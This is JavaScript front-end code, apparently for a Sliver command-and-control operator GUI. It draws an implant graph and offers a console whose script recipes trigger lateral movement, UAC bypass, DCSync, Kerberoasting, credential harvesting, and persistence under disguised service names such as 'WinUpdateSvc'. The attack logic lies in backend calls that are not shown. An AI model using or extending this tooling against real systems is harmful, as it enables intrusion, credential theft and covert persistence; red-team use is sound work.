      if (p) (kidsOf[p] = kidsOf[p] || []).push(nd.obj.id);
    });
    const roots = nodes.filter(nd => !parentNodeId[nd.obj.id]).map(nd => nd.obj.id);

    // Tidy left-to-right tree: x = depth column, y = leaf order (parents centred
    // on the span of their children). rowH > node height so labels never overlap.
    const layout = {}, colW = 200, rowH = 116, topPad = 50;
    let row = 0;
    const placed = {};
    const place = (id, depth) => {
      if (placed[id]) return layout[id] ? layout[id].y : topPad + row * rowH;
      placed[id] = 1;
      const x = fwX + depth * colW;
      const kids = (kidsOf[id] || []).filter(k => !placed[k]);
      let y;
      if (!kids.length) { y = topPad + row * rowH; row++; }
      else { const ys = kids.map(k => place(k, depth + 1)); y = (Math.min(...ys) + Math.max(...ys)) / 2; }
      layout[id] = { x, y };
      return y;
    };
    roots.forEach(r => place(r, 1));
    nodes.forEach(nd => { if (!placed[nd.obj.id]) place(nd.obj.id, 1); });

    // Vertically centre the whole tree in the viewport.
    const yvals = Object.values(layout).map(p => p.y);
    if (yvals.length) {
      const mid = (Math.min(...yvals) + Math.max(...yvals)) / 2;
      const dy = H / 2 - mid;
      Object.values(layout).forEach(p => p.y += dy);
    }
    svg._layout = layout; svg._fwX = fwX; svg._fwY = fwY;
    // Priority: live drag > persisted position > computed layout.
    const posOf  = id => graphDrag[id] || graphPos[id] || layout[id] || { x: fwX + colW, y: H / 2 };
    // Icon half-width is 26px; inset the arrows well past it on BOTH ends so
    // every edge has the same clear, tidy gap before the node/firewall icon.
    const NODE_R = 46, FW_R = 48;

    // Build edge list - firewall → every root, then parent → child.
    graphEdges = [];
    roots.forEach(id => graphEdges.push({ from:'__fw__', to:id, isJump:false }));
    nodes.forEach(nd => {
      const p = parentNodeId[nd.obj.id];
      if (p) graphEdges.push({ from:p, to:nd.obj.id, isJump: jumpEdgeSet.has(`${p}:${nd.obj.id}`) });
    });

    const fwPos = { x: fwX, y: fwY };

    // SVG defs - arrowheads for green/red/blue/orange
    let html = '<defs>' +
      '<marker id="ar-green"        viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#35c46b"/></marker>' +
      '<marker id="ar-red"          viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#e23c4e"/></marker>' +
      '<marker id="ar-blue"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#4d9fe6"/></marker>' +
      '<marker id="ar-grey"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#6b7280"/></marker>' +
      '<marker id="ar-orange-end"   viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
      '<marker id="ar-orange-start" viewBox="0 0 10 10" refX="1.5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
      '</defs>';

    html += `<g id="g-root" transform="translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})">`;

    // Draw edges
    graphEdges.forEach(ed => {
      const src  = ed.from === '__fw__' ? fwPos : posOf(ed.from);
      const tgt  = posOf(ed.to);
      const srcR = ed.from === '__fw__' ? FW_R : NODE_R;
      const eid  = `ge-${ed.from}-${ed.to}`;
      if (ed.isJump) {
        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
          stroke="#f5a623" stroke-width="2.2" stroke-dasharray="9 5" fill="none"
          marker-end="url(#ar-orange-end)" marker-start="url(#ar-orange-start)" opacity="0.92"/>`;
      } else {
        const col = edgeColor(nodeByID[ed.to]);
        const mk  = col === '#4d9fe6' ? 'ar-blue' : col === '#e23c4e' ? 'ar-red' : col === '#6b7280' ? 'ar-grey' : 'ar-green';
        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
          stroke="${col}" stroke-width="2.4" fill="none" marker-end="url(#${mk})"/>`;
      }
    });

    // Firewall icon - brick wall + flame, NO text label
    html += `<g pointer-events="none" transform="translate(${fwX},${fwY})">`;
    const bw = 15, bh = 9;
    for (let r = 0; r < 5; r++) {
      const oy = -22 + r * bh, off = (r % 2) ? bw / 2 : 0;
      for (let c = -1; c < 2; c++)
        html += `<rect x="${c*bw+off-7}" y="${oy}" width="${bw-1.5}" height="${bh-1.5}" fill="#9a3b2e" stroke="#5f231b" stroke-width="0.8"/>`;
    }
    html += '<text x="-19" y="7" font-size="30" text-anchor="middle">\uD83D\uDD25</text>';
    html += '</g>';

    // Agent nodes
    nodes.forEach(nd => {
      const o    = nd.obj, p = posOf(o.id), dead = o.isDead, priv = isPrivileged(o);
      const isJumpRelated = jumpEdgeSet.size > 0 &&
        [...jumpEdgeSet].some(k => k.startsWith(o.id + ':') || k.endsWith(':' + o.id));
      html += `<g class="gnode${dead ? ' dead' : ''}" data-id="${esc(o.id)}" transform="translate(${p.x},${p.y})" style="cursor:grab">`;
      html += '<rect x="-30" y="-34" width="60" height="94" fill="transparent"/>';
      if (o.id === activeInteractId)
        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#35c46b" stroke-width="1.5" stroke-dasharray="5 4"/>';
      else if (isJumpRelated)
        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#f5a623" stroke-width="1.2" stroke-dasharray="6 4" opacity="0.65"/>';
      html += `<image href="${osIconHref(o.os, priv, dead)}" x="-26" y="-26" width="52" height="52" pointer-events="none"/>`;
      const user = shortUser(o.username) + (priv && !dead ? ' *' : '');
      const l2   = `${o.hostname || o.id.slice(0, 6)}${o.pid ? ' @ ' + o.pid : ''}`;
      const lc   = dead ? 'var(--muted)' : (priv ? 'var(--accent)' : 'var(--text)');
      html += `<text y="40" text-anchor="middle" fill="${lc}" font-size="10" font-weight="bold" font-family="var(--font)" pointer-events="none">${esc(user)}</text>`;
      html += `<text y="51" text-anchor="middle" fill="var(--muted)" font-size="8.5" font-family="var(--mono)" pointer-events="none">${esc(l2)}</text>`;
      if (dead) html += '<text y="-30" text-anchor="middle" fill="var(--muted)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">DEAD</text>';
      html += '</g>';
    });

    html += '</g>';
    svg.innerHTML = html;

    const byId = {}; nodes.forEach(nd => byId[nd.obj.id] = nd);
    svg.querySelectorAll('.gnode').forEach(el => {
      const nd = byId[el.dataset.id];
      if (!nd) return;
      // Live agents: double-click opens the interaction console (existing).
      if (!nd.obj.isDead) el.addEventListener('dblclick', () => openInteract(nd.kind, nd.obj));
      // All agents (dead included): right-click opens the same feature menu
      // the table view uses - parity between the two visualisations so
      // operators don't need to bounce back to the table to run an action.
      el.addEventListener('contextmenu', ev => showCtx(ev, nd.kind, nd.obj));
    });
    setupGraphInteraction(svg);
  } catch (err) { console.error('renderGraph failed:', err); }
}

// setupGraphInteraction wires node drag, canvas pan and wheel zoom.
// Guards with svg._wired so it only sets up once per SVG lifetime.
// Call svg._wired = false before renderGraph() when you need a fresh setup (e.g. resetGraph).
function setupGraphInteraction(svg) {
  if (svg._wired) return;
  svg._wired = true;
  let mode = null, dragId = null, startX = 0, startY = 0, origX = 0, origY = 0;

  const applyView = () => {
    const root = document.getElementById('g-root');
    if (root) root.setAttribute('transform', `translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})`);
  };
  const posOf = id => graphDrag[id] || graphPos[id] || (svg._layout && svg._layout[id]) || { x: (svg._fwX||74) + 200, y: svg._fwY || 0 };

  svg.addEventListener('mousedown', e => {
    const nodeEl = e.target.closest('.gnode');
    startX = e.clientX; startY = e.clientY;
    if (nodeEl) {
      mode = 'node'; dragId = nodeEl.dataset.id;
      const pp = posOf(dragId); origX = pp.x; origY = pp.y;
      nodeEl.style.cursor = 'grabbing';
    } else {
      mode = 'pan'; origX = graphView.tx; origY = graphView.ty;
      svg.style.cursor = 'grabbing';
    }
    e.preventDefault();
  });

  document.addEventListener('mousemove', e => {
    if (!mode) return;
    if (mode === 'node') {
      const dx = (e.clientX - startX)/graphView.scale, dy = (e.clientY - startY)/graphView.scale;
      const nx = origX + dx, ny = origY + dy;
      graphDrag[dragId] = { x: nx, y: ny };
      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`);
      if (g) g.setAttribute('transform', `translate(${nx},${ny})`);
      (graphEdges || []).forEach(ed => {
        if (ed.from !== dragId && ed.to !== dragId) return;
        const src = ed.from === '__fw__' ? { x: svg._fwX, y: svg._fwY } : posOf(ed.from), tgt = posOf(ed.to);
        const el = document.getElementById(`ge-${ed.from}-${ed.to}`);
        if (el) el.setAttribute('d', edgeD(src, tgt, ed.from === '__fw__' ? 48 : 46, 46));
      });
    } else if (mode === 'pan') {
      graphView.tx = origX + (e.clientX - startX);
      graphView.ty = origY + (e.clientY - startY);
      applyView();
    }
  });

  document.addEventListener('mouseup', () => {
    if (mode === 'pan') svg.style.cursor = '';
    if (mode === 'node' && dragId) {
      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`); if (g) g.style.cursor = 'grab';
      // Persist the dragged position so it survives refresh / reconnect.
      if (graphDrag[dragId]) { graphPos[dragId] = { ...graphDrag[dragId] }; saveState(); }
    }
    mode = null; dragId = null;
  });

  svg.addEventListener('wheel', e => {
    e.preventDefault();
    const rect = svg.getBoundingClientRect();
    const mx = e.clientX - rect.left, my = e.clientY - rect.top;
    const factor = e.deltaY < 0 ? 1.12 : 1/1.12;
    const ns = Math.min(3, Math.max(0.3, graphView.scale * factor));
    graphView.tx = mx - (mx - graphView.tx) * (ns/graphView.scale);
    graphView.ty = my - (my - graphView.ty) * (ns/graphView.scale);
    graphView.scale = ns;
    applyView();
  }, { passive: false });
}

// Reset the graph layout/view to its default.
// Clears all dragged positions, resets pan/zoom, and forces interaction re-init.
function resetGraph() {
  for (const k in graphPos)  delete graphPos[k];
  for (const k in graphDrag) delete graphDrag[k];
  graphView  = { tx: 0, ty: 0, scale: 1 };
  graphCenter = null;
  saveState();               // persist the cleared layout so it sticks
  // Do NOT reset svg._wired - the pan/drag/zoom listeners are delegated on the
  // svg/document and survive re-renders. Re-wiring would stack duplicate handlers.
  renderGraph();             // re-renders with cleared drags + reset pan/zoom
  toast('ok', 'Graph layout reset');
}

// ── Context menu ───────────────────────────────────────────────────────────
const ctxMenu = document.getElementById('ctx-menu');
function showCtx(e, kind, obj) {
  e.preventDefault();
  activeCtxAgent = { kind, obj };
  // Every item declares data-for=session|beacon|both. Hide anything that
  // doesn't apply to this agent so operators never click something
  // meaningless (e.g. File Browser on a beacon that has no interactive
  // session). Dividers with data-for also collapse to keep the menu tight.
  ctxMenu.querySelectorAll('[data-for]').forEach(el => {
    const wants = el.dataset.for;
    el.style.display = (wants === 'both' || wants === kind) ? '' : 'none';
  });
  // Collapse consecutive dividers left over after filtering.
  let prevWasDivider = true; // treat top edge as a divider so leading ones hide
  const items = Array.from(ctxMenu.children);
  items.forEach(el => {
    if (el.style.display === 'none') return;
    if (el.classList.contains('ctx-divider')) {
      if (prevWasDivider) el.style.display = 'none';
      prevWasDivider = true;
    } else {
      prevWasDivider = false;
    }
  });
  // Position - clamp to viewport so the last row stays clickable even
  // when we right-click near the bottom edge.
  const vw = window.innerWidth, vh = window.innerHeight;
  ctxMenu.style.left = Math.min(e.clientX, vw - 220) + 'px';
  ctxMenu.style.top  = Math.min(e.clientY, vh - 340) + 'px';
  ctxMenu.classList.remove('hidden');
}
document.addEventListener('click', () => ctxMenu.classList.add('hidden'));
document.getElementById('ctx-interact').addEventListener('click', () => { if (activeCtxAgent) openInteract(activeCtxAgent.kind, activeCtxAgent.obj); });
// Check Integrity removed from the right-click menu - it fired an inline
// command (getprivs) rather than opening a feature panel, and the operator
// asked for feature-only right-click entries. The functionality remains
// available inside the interactive console via `getprivs`.
document.getElementById('ctx-rename').addEventListener('click', async () => {
  if (!activeCtxAgent) return;
  const { kind, obj } = activeCtxAgent;
  const n = await uiPrompt('New name:', obj.name || '');
  if (!n) return;
  // Sliver's Rename RPC accepts both SessionID and BeaconID - the current
  // RenameSession(id) wrapper sets SessionID. For beacons we call a
  // dedicated wrapper if it exists; otherwise fall back to the same call
  // (the teamserver looks up either ID kind). That way beacons can be
  // renamed from the same UI without dropping into the console.
  const call = (kind === 'beacon' && typeof App().RenameBeacon === 'function')
    ? App().RenameBeacon(obj.id, n)
    : App().RenameSession(obj.id, n);
  await call
    .then(() => toast('ok', kind + ' renamed'))
    .catch(e => toast('err', 'Rename failed: ' + e));
  refreshAgents();
});
// Copy agent ID → clipboard. Small QoL - operators often need the ID to
// reference agents in server-console commands (`use <id>`).
document.getElementById('ctx-copyid')?.addEventListener('click', () => {
  if (!activeCtxAgent) return;
  const id = activeCtxAgent.obj.id;
  navigator.clipboard?.writeText(id).then(() => toast('ok', 'Copied ' + id.slice(0, 8) + '…'));
});
// Copy display name - removed from the menu (Copy remote IP and Copy agent
// ID cover the two useful cases). Handler intentionally left absent.
// Beacon-sleep item - jumps straight into the Beacon Sleep dashboard,
// which lets the operator adjust just this beacon or apply a preset to
// the whole fleet.
document.getElementById('ctx-sleep')?.addEventListener('click', () => {
  if (!activeCtxAgent || activeCtxAgent.kind !== 'beacon') return;
  switchView('sleep');
});
document.getElementById('ctx-kill').addEventListener('click', async () => {
  if (!activeCtxAgent) return;
  const { kind, obj } = activeCtxAgent;
  if (!(await uiConfirm(`Kill ${kind} on ${obj.hostname || obj.id}?`, { title: 'Kill agent', okLabel: 'Kill', danger: true }))) return;
  const call = kind === 'session' ? App().KillSession(obj.id) : App().KillBeacon(obj.id);
  await call
    .then(() => toast('ok', `Killed ${kind} ${obj.hostname || ''}`.trim()))
    .catch(e => toast('err', 'Kill failed: ' + e));
  refreshAgents();
});

// ── Interaction panel ──────────────────────────────────────────────────────
function openInteract(kind, obj) {
  const id = obj.id;
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind, obj };
  document.getElementById('empty-interact')?.remove();
  // Create tab
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>[${kind.slice(0,3)}] ${esc(obj.hostname||obj.id.slice(0,6))}</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);

  // Create panel
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  const promptStr = `${shortUser(obj.username)}@${obj.hostname||'?'} :>`;
  const helpText = kind === 'beacon'
    ? `[beacon] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
      `[info] Interval: ${fmtDur(obj.interval)} | Jitter: ${fmtDur(obj.jitter)}\n` +
      `[info] Commands are queued and execute on next check-in.\n` +
      `[info] Type 'help' for available commands.\n`
    : `[session] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
      `[info] Interactive session. Commands execute immediately.\n` +
      `[info] Type 'help' for available commands.\n`;
  panel.innerHTML = `
    <div class="console-script-bar" id="csb-${id}">
      <div class="csb-header">
        <div class="csb-title">
          <span class="csb-badge">SCRIPTS</span>
          <span class="csb-target">Pivot: ${esc(obj.hostname || obj.id.slice(0,8))} (${obj.os}/${obj.arch})</span>
        </div>
        <div class="csb-cats" id="csb-cats-${id}"></div>
        <button class="csb-toggle-btn" id="csb-toggle-${id}">Show Scripts</button>
      </div>
      <div class="csb-body" id="csb-body-${id}" style="display:none">
        <div class="csb-grid" id="csb-recipes-${id}"></div>
        <div class="csb-card" id="csb-card-${id}" style="display:none">
          <div class="csb-card-header">
            <h4 id="csb-card-title-${id}"></h4>
            <p id="csb-card-desc-${id}"></p>
          </div>
          <div class="csb-form-grid" id="csb-form-${id}"></div>
          <div class="csb-actions">
            <button class="csb-btn csb-btn-preview" id="csb-btn-prev-${id}">Preview / Dry-Run</button>
            <button class="csb-btn csb-btn-exec" id="csb-btn-exec-${id}">Execute Recipe</button>
          </div>
        </div>
      </div>
    </div>
    <div class="console-out" id="cout-${id}"><span class="info">${esc(helpText)}</span></div>
    <div class="console-in"><span class="console-prompt">${esc(promptStr)} </span><input class="console-input" id="cinp-${id}" placeholder="type a command..." autocomplete="off"/></div>
  `;
  document.getElementById('interact-panels').appendChild(panel);
  // Wire input
  const inp = document.getElementById(`cinp-${id}`);
  const hist = []; let hIdx = -1;
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') { runAgentCmd(kind, id, inp, hist); hIdx = -1; }
    if (e.key === 'ArrowUp') { if (hIdx < hist.length-1) { hIdx++; inp.value = hist[hIdx]; } e.preventDefault(); }
    if (e.key === 'ArrowDown') { if (hIdx > 0) { hIdx--; inp.value = hist[hIdx]; } else { hIdx=-1; inp.value=''; } e.preventDefault(); }
  });
  attachConsoleScriptManager(id, kind, obj);
  activateTab(id);
}

function attachConsoleScriptManager(id, kind, obj) {
  const catsEl = document.getElementById(`csb-cats-${id}`);
  const gridEl = document.getElementById(`csb-recipes-${id}`);
  const cardEl = document.getElementById(`csb-card-${id}`);
  const cardTitle = document.getElementById(`csb-card-title-${id}`);
  const cardDesc = document.getElementById(`csb-card-desc-${id}`);
  const formEl = document.getElementById(`csb-form-${id}`);
  const btnPrev = document.getElementById(`csb-btn-prev-${id}`);
  const btnExec = document.getElementById(`csb-btn-exec-${id}`);
  const toggleBtn = document.getElementById(`csb-toggle-${id}`);
  const csbBody = document.getElementById(`csb-body-${id}`);

  let activeCat = 'All';
  let activeScript = null;
  let allScriptList = [];

  toggleBtn?.addEventListener('click', () => {
    const isHidden = csbBody.style.display === 'none';
    csbBody.style.display = isHidden ? 'block' : 'none';
    toggleBtn.textContent = isHidden ? 'Hide Scripts' : 'Show Scripts';
    const title = document.querySelector(`#csb-${id} .csb-title`);
    const cats = document.getElementById(`csb-cats-${id}`);
    if (title) title.style.display = isHidden ? '' : 'none';
    if (cats) cats.style.display = isHidden ? '' : 'none';
  });
  // Start collapsed: hide title and categories
  const initTitle = document.querySelector(`#csb-${id} .csb-title`);
  const initCats = document.getElementById(`csb-cats-${id}`);
  if (initTitle) initTitle.style.display = 'none';
  if (initCats) initCats.style.display = 'none';

  App().ListScripts().then(scripts => {
    const targetOS = (obj.os || 'windows').toLowerCase();
    allScriptList = (scripts || []).filter(s => {
      if (!s.targetOS || s.targetOS === 'all') return true;
      return targetOS.includes(s.targetOS);
    });
    const cats = ['All'];
    allScriptList.forEach(s => { if (!cats.includes(s.category)) cats.push(s.category); });

    catsEl.innerHTML = cats.map(c => `<button class="csb-cat-tab ${c === 'All' ? 'active' : ''}" data-cat="${esc(c)}">${esc(c)}</button>`).join('');
    catsEl.querySelectorAll('.csb-cat-tab').forEach(tb => {
      tb.addEventListener('click', () => {
        catsEl.querySelectorAll('.csb-cat-tab').forEach(x => x.classList.remove('active'));
        tb.classList.add('active');
        activeCat = tb.dataset.cat;
        renderRecipes();
      });
    });

    renderRecipes();
  }).catch(() => {});

  function renderRecipes() {
    gridEl.innerHTML = '';
    const filtered = activeCat === 'All' ? allScriptList : allScriptList.filter(s => s.category === activeCat);
    filtered.forEach(s => {
      const btn = document.createElement('button');
      btn.className = `csb-recipe-btn ${activeScript && activeScript.method === s.method ? 'active' : ''}`;
      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
      const opsecClass = (s.opsec || 'low').toLowerCase();
      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
      btn.innerHTML = `<span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}`;
      btn.title = s.description;
      btn.addEventListener('click', () => selectRecipe(s));
      gridEl.appendChild(btn);
    });
  }

  function selectRecipe(s) {
    activeScript = s;
    renderRecipes();

    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
    const opsecClass = (s.opsec || 'low').toLowerCase();
    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} Noise</span>` : '';
    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
    cardDesc.textContent = s.description;

    formEl.innerHTML = '';
    if (s.params && s.params.length > 0) {
      s.params.forEach(p => {
        const field = document.createElement('div');
        let inputHtml = '';
        if (p.type === 'select') {
          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
          inputHtml = `<select id="csb-f-${id}-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
        } else {
          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
          const val = p.default || '';
          const ph = p.placeholder || '';
          inputHtml = `<input id="csb-f-${id}-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
        }
        field.innerHTML = `<label style="color:var(--muted);font-size:10.5px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
        formEl.appendChild(field);
      });
    } else {
      formEl.innerHTML = `<div style="color:var(--muted);font-size:11px;grid-column:1/-1">No extra parameters needed. Click Preview or Execute to run recipe on <b>${esc(obj.hostname || id.slice(0,8))}</b>.</div>`;
    }

    cardEl.style.display = 'block';
  }

  function getParams() {
    if (!activeScript) return {};
    const map = {};
    if (activeScript.params) {
      activeScript.params.forEach(p => {
        const el = document.getElementById(`csb-f-${id}-${p.name}`);
        if (el) map[p.name] = el.value;
      });
    }
    return map;
  }

  btnPrev?.addEventListener('click', async () => {
    if (!activeScript) return;
    btnPrev.disabled = true;
    appendOut(id, `[*] Generating preview for recipe: ${activeScript.name}...`, 'pending');
    try {
      const pmap = getParams();
      const res = await App().ScriptPreview(id, activeScript.method, pmap);
      if (res.error) {
        appendOut(id, `[error] ${res.error}`, 'err');
      } else {
        appendOut(id, res.output, 'info');
      }
    } catch (e) {
      appendOut(id, `[error] ${e}`, 'err');
    }
    btnPrev.disabled = false;
  });

  btnExec?.addEventListener('click', async () => {
    if (!activeScript) return;
    btnExec.disabled = true;
    const method = activeScript.method;
    const pmap = getParams();

    appendOut(id, `[*] Executing script recipe: ${activeScript.name}...`, 'cmd');
    let result;
    try {
      switch (method) {
        case 'ScriptSpawnLocal':
          result = await App().ScriptSpawnLocal(id, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
          if (!result.error) renderGraph();
          break;
        case 'ScriptSSHDeploy':
          result = await App().ScriptSSHDeploy(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSpawnLinux':
          result = await App().ScriptSpawnLinux(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSSHExecSimple':
          result = await App().ScriptSSHExecSimple(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
          break;
        case 'ScriptSSHCheck':
          result = await App().ScriptSSHCheck(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
          break;
        case 'ScriptSpawnWindows':
          result = await App().ScriptSpawnWindows(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
          break;
        case 'ScriptPsExec':
          result = await App().ScriptPsExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptWMIExec':
          result = await App().ScriptWMIExec(id, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
          break;
        case 'ScriptWinRMExec':
          result = await App().ScriptWinRMExec(id, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
          break;
        case 'ScriptSCDeploy':
          result = await App().ScriptSCDeploy(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptSMBUploadExec':
          result = await App().ScriptSMBUploadExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptPrivescCheck':
          result = await App().ScriptPrivescCheck(id);
          break;
        case 'ScriptSudoExploit':
          result = await App().ScriptSudoExploit(id, pmap.method || 'find');
          break;
        case 'ScriptWinPrivescCheck':
          result = await App().ScriptWinPrivescCheck(id);
          break;
        case 'ScriptTokenImpersonate':
          result = await App().ScriptTokenImpersonate(id, pmap.targetUser || '');
          break;
        case 'ScriptGetSystem':
          result = await App().ScriptGetSystem(id, pmap.profile || '');
          break;
        case 'ScriptUACBypass':
          result = await App().ScriptUACBypass(id, pmap.beaconPath || '');
          break;
        case 'ScriptPersistCron':
          result = await App().ScriptPersistCron(id, pmap.cronLine || '');
          break;
        case 'ScriptPersistSSHKey':
          result = await App().ScriptPersistSSHKey(id, pmap.pubKey || '', pmap.targetUser || 'root');
          break;
        case 'ScriptPersistSystemd':
          result = await App().ScriptPersistSystemd(id, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
          break;
        case 'ScriptPersistRegRun':
          result = await App().ScriptPersistRegRun(id, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
          break;
        case 'ScriptPersistSchedTask':
          result = await App().ScriptPersistSchedTask(id, pmap.beaconPath || '', pmap.taskName || '');
          break;
        case 'ScriptPersistService':
          result = await App().ScriptPersistService(id, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
          break;
        case 'ScriptPersistWMI':
          result = await App().ScriptPersistWMI(id, pmap.beaconPath || '');
          break;
        case 'ScriptPersistStartup':
          result = await App().ScriptPersistStartup(id, pmap.beaconPath || '');
          break;
        case 'ScriptHarvestCreds':
          result = await App().ScriptHarvestCreds(id);
          break;
        case 'ScriptWinHarvestCreds':
          result = await App().ScriptWinHarvestCreds(id);
          break;
        case 'ScriptKerberoast':
          result = await App().ScriptKerberoast(id);
          break;
        case 'ScriptDCSync':
          result = await App().ScriptDCSync(id);
          break;
        case 'ScriptNetworkScan':
          result = await App().ScriptNetworkScan(id, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
          break;
        case 'ScriptADEnum':
          result = await App().ScriptADEnum(id);
          break;
        case 'ScriptWinLocalEnum':
          result = await App().ScriptWinLocalEnum(id);
          break;
        default:
          result = { error: 'Unknown script: ' + method };
      }
    } catch (e) {
      result = { error: String(e) };
    }

    btnExec.disabled = false;
    if (result.error) {
      appendOut(id, `[error] ${result.error}${result.output ? '\n' + result.output : ''}`, 'err');
    } else {
      appendOut(id, result.output || '[+] Done', 'ok');
    }
  });
}

function activateTab(id) {
  document.querySelectorAll('.interact-tab').forEach(t => t.classList.toggle('active', t.dataset.tid === id));
  document.querySelectorAll('.interact-panel').forEach(p => p.classList.toggle('active', p.id === `ip-${id}`));
  // The tab already shows the hostname - the label shows only the extra detail
  // (user · os/arch) so the name isn't repeated twice in the bar.
  const t = openTabs[id], label = document.getElementById('interact-label');
  activeInteractId = (t && t.obj) ? id : null;   // only real agents have notes
  if (label) label.textContent = '';             // tab already shows the agent; no extra label
  document.getElementById(`cinp-${id}`)?.focus();
}
function closeTab(id) {
  const t = openTabs[id];
  // Tear down an interactive shell's tunnel + event listeners on close.
  if (t && t.kind === 'shell') {
    App().StopInteractiveShell(t.tid).catch(()=>{});
    if (window.runtime) { window.runtime.EventsOff(t.evtOut); window.runtime.EventsOff(t.evtClose); }
  }
  delete openTabs[id];
  document.querySelector(`.interact-tab[data-tid="${id}"]`)?.remove();
  document.getElementById(`ip-${id}`)?.remove();
  const first = document.querySelector('.interact-tab');
  if (first) activateTab(first.dataset.tid);
}

// ── Command execution ──────────────────────────────────────────────────────
const HELP_TEXT = `
Core commands (session & beacon):
  help                       Show this help
  info                       Show agent info
  clear                      Clear the console
  shell <cmd>                Run a command in the OS shell (raw text works too)
  shell -i  (or  pty)        Open a real-time interactive shell (session only)
  execute <path> [args]      Run a program directly (no shell wrapper)
  grep [-r] <pattern> <path> Search file contents on the target
  mount                      List mounted drives/filesystems
  memfiles [list|add|rm <fd>]  Anonymous in-memory files
  ssh <user>@<host>[:port] [-p <pass>] <cmd>   Run a command over SSH from the implant
  ps                         List processes
  ls [path]                  List files (uses current dir)
  cd <path>                  Change working directory
  pwd                        Show current directory
  download <remote> [local]  Download a file (2nd arg = local path, else dialog)
  upload <local> <remote>    Upload a local file to the target (or 'upload' for dialog)
  cat <remote>               Print a remote text file
  mkdir <path>               Create a directory
  rm <path>                  Remove a file/dir
  mv <src> <dst>             Move/rename a file
  cp <src> <dst>             Copy a file
  screenshot                 Capture the desktop
  netstat                    Network connections
  ifconfig                   Network interfaces
  env / getenv <name>        Environment variables
  setenv <K> <V>             Set an env var
  unsetenv <K>               Unset an env var
  reg query|read|write|read-hive|listkeys|createkey|deletekey ...   Windows registry (HKLM/HKCU/...)
  svc list|info|start|stop|create|remove <name>   Windows service control
  whoami                     Current token owner
  getprivs                   Token privileges (Windows)
  procdump <pid>             Dump process memory
  kill <pid>                 Terminate a remote process
